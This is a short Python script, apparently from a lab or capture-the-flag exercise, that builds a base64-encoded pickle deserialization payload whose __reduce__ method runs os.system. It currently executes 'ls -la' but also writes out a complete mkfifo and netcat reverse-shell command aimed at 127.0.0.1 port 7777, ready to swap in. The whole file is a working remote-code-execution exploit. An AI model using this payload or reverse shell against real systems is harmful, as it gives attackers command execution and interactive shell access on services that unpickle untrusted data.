#!/usr/bin/python3
import pickle
import base64
import os

class rce():
  def __reduce__(self):
    reverse_shell = ('rm /tmp/f; mkfifo /tmp/f;'
            'cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 7777 > /tmp/f')

    ls_cmd = ('ls -la')
    return os.system, (ls_cmd,)

# base64-encode and print the payload
print(base64.b64encode(pickle.dumps(rce())))

